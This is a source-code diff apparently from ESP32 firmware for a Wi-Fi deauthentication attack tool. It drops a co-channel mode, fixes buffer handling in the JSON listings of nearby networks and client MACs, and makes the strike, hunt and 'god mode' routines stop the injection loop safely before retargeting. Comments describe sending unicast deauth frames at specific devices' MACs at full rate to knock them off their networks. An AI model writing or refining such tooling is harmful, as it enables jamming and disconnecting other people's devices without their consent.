@@ -45,10 +45,6 @@ static volatile int s_sel_count = 0;
 // Transient activity for the LED: 0 none, 1 scanning, 2 counting devices.
 static volatile int s_busy = 0;
 
-// Co-channel mode: AP parked on a single 2.4 GHz target's channel, so the phone
-// stays connected while we inject continuously (no channel hopping).
-static volatile bool s_cochannel = false;
-
 // Live TX rate (frames/sec), updated once a second.
 static volatile uint32_t s_rate = 0;
 
@@ -170,9 +166,9 @@ static void stats_task(void *arg)
         if (s_mode != MODE_IDLE || s_rate) {
             uint32_t total = ok + fail;
             int failpct = total ? (int)((uint64_t)fail * 100 / total) : 0;
-            ESP_LOGI(TAG, "==== %lu frames/sec | sent=%lu fail=%lu (%d%% fail) | %s%s | heap %lu (min %lu) ====",
+            ESP_LOGI(TAG, "==== %lu frames/sec | sent=%lu fail=%lu (%d%% fail) | %s | heap %lu (min %lu) ====",
                      (unsigned long)s_rate, (unsigned long)ok, (unsigned long)fail, failpct,
-                     control_mode_str(), s_cochannel ? " CO-CHANNEL" : "",
+                     control_mode_str(),
                      (unsigned long)heap, (unsigned long)minheap);
             const wifi_network_t *nets = NULL;
             int cnt = wifi_get_networks(&nets);
@@ -267,13 +263,23 @@ static const char *auth_str(uint8_t a)
     }
 }
 
+// Append helper that tracks the ACTUAL end of the buffer content. snprintf's
+// return value is the desired (untruncated) length, so accumulating it directly
+// can push the write offset past `cap`; clamping here keeps pos <= strlen(out).
+#define JSON_APPEND(pos, cap, ...) do { \
+    if ((pos) < (cap) - 1) { \
+        int w_ = snprintf((out) + (pos), (cap) - (pos), __VA_ARGS__); \
+        if (w_ > 0) (pos) += (w_ > (cap) - 1 - (pos)) ? (cap) - 1 - (pos) : w_; \
+    } \
+} while (0)
+
 int control_list_json(char *out, int cap)
 {
     const wifi_network_t *nets = NULL;
     int n = wifi_get_networks(&nets);
     int len = snprintf(out, cap, "[");
-    for (int i = 0; i < n && len < cap - 160; i++) {
-        len += snprintf(out + len, cap - len,
+    for (int i = 0; i < n; i++) {
+        JSON_APPEND(len, cap,
             "%s{\"i\":%d,\"ssid\":\"%s\",\"band\":\"%s\",\"ch\":%u,\"rssi\":%d,"
             "\"prot\":%s,\"safe\":%s,\"sec\":\"%s\",\"clients\":%u,\"tx\":%lu,\"bssid\":\"%02x:%02x:%02x:%02x:%02x:%02x\"}",
             i ? "," : "", i,
@@ -286,7 +292,7 @@ int control_list_json(char *out, int cap)
             nets[i].bssid[0], nets[i].bssid[1], nets[i].bssid[2],
             nets[i].bssid[3], nets[i].bssid[4], nets[i].bssid[5]);
     }
-    len += snprintf(out + len, cap - len, "]");
+    JSON_APPEND(len, cap, "]");
     return len;
 }
 
@@ -313,16 +319,16 @@ int control_devices_json(int idx, char *out, int cap)
     wifi_client_t cl[WIFI_MAX_CLIENTS];
     int c = wifi_get_clients(idx, cl, WIFI_MAX_CLIENTS);
     int len = snprintf(out, cap, "[");
-    for (int i = 0; i < c && len < cap - 96; i++) {
+    for (int i = 0; i < c; i++) {
         bool priv = cl[i].mac[0] & 0x02;   // locally-administered = randomized
-        len += snprintf(out + len, cap - len,
+        JSON_APPEND(len, cap,
             "%s{\"mac\":\"%02x:%02x:%02x:%02x:%02x:%02x\",\"rssi\":%d,\"pkts\":%u,\"priv\":%s}",
             i ? "," : "",
             cl[i].mac[0], cl[i].mac[1], cl[i].mac[2],
             cl[i].mac[3], cl[i].mac[4], cl[i].mac[5],
             cl[i].rssi, cl[i].pkts, priv ? "true" : "false");
     }
-    len += snprintf(out + len, cap - len, "]");
+    JSON_APPEND(len, cap, "]");
     return len;
 }
 
@@ -339,13 +345,16 @@ int control_attack_selection(const int *idx, int n)
     const wifi_network_t *nets = NULL;
     int have = wifi_get_networks(&nets);
     int k = 0;
+    // Halt any running attack FIRST: the attack task reads s_sel[] every cycle,
+    // and we're about to overwrite it (re-arming mid-attack would otherwise feed
+    // it torn wifi_network_t snapshots).
+    s_mode = MODE_IDLE;
+    vTaskDelay(pdMS_TO_TICKS(5));   // let the current iteration observe the stop
     for (int i = 0; i < n && k < WIFI_MAX_NETWORKS; i++) {
         if (idx[i] >= 0 && idx[i] < have) { s_sel[k] = nets[idx[i]]; s_sel_idx[k] = idx[i]; k++; }
     }
     if (k == 0) return -1;
     s_sel_count = k;
-
-    s_cochannel = false;   // full-rate hammer; phone drops during attack (physics)
 
     // Discover each target's clients FIRST. Modern devices IGNORE broadcast
     // deauth and only honour unicast frames addressed to their MAC, so we camp
@@ -363,11 +372,12 @@ int control_attack_selection(const int *idx, int n)
 int control_strike(uint8_t ch, int is5, const uint8_t bssid[6], const uint8_t mac[6])
 {
     if (!bssid || !mac || ch == 0) return -1;
+    s_mode = MODE_IDLE;             // halt the loop before rewriting its targets
+    vTaskDelay(pdMS_TO_TICKS(5));
     memcpy(s_strike_bssid, bssid, 6);
     memcpy(s_strike_mac,   mac,   6);
     s_strike_ch = ch;
     s_strike_5  = is5 ? true : false;
-    s_cochannel = false;
     // AP-only during a strike: in APSTA the idle STA still periodically pulls the
     // radio off-channel (kills the 5 GHz rate). We don't sniff during a strike,
     // so drop the STA and give the radio entirely to the parked AP.
@@ -390,6 +400,8 @@ int control_hunt(const uint8_t mac[6], const uint8_t (*bssids)[6],
                  const uint8_t *chans, const int *is5, int n)
 {
     if (!mac || n <= 0 || n > 4) return -1;
+    s_mode = MODE_IDLE;             // halt the loop before rewriting its targets
+    vTaskDelay(pdMS_TO_TICKS(5));
     memcpy(s_hunt_mac, mac, 6);
     for (int i = 0; i < n; i++) {
         memcpy(s_hunt[i].bssid, bssids[i], 6);
@@ -397,7 +409,6 @@ int control_hunt(const uint8_t mac[6], const uint8_t (*bssids)[6],
         s_hunt[i].is5 = is5[i] ? true : false;
     }
     s_hunt_n = n;
-    s_cochannel = false;
     esp_wifi_set_mode(WIFI_MODE_AP);   // AP-only: give the whole radio to injection
     ESP_LOGW(TAG, "HUNT %02x:%02x:%02x:%02x:%02x:%02x across %d band(s), %dms/band",
              mac[0], mac[1], mac[2], mac[3], mac[4], mac[5], n, (int)(HUNT_DWELL_US/1000));
@@ -407,7 +418,6 @@ int control_hunt(const uint8_t mac[6], const uint8_t (*bssids)[6],
 
 void control_god(void)
 {
-    s_cochannel = false;            // promiscuous OFF during attack (it throttles TX)
     esp_wifi_set_mode(WIFI_MODE_APSTA);   // strike/hunt drop STA; God's refresh scan needs it
     god_mode_start();
     s_mode = MODE_GOD;
@@ -418,7 +428,6 @@ void control_stop(void)
     s_mode = MODE_IDLE;
     god_mode_stop();
     wifi_promisc_discovery(false);
-    s_cochannel = false;
     esp_wifi_set_mode(WIFI_MODE_APSTA);     // restore STA (strike drops it) for scanning
     wifi_set_ap_channel(WIFI_AP_HOME_CH);   // AP back home so the phone reconnects
 }
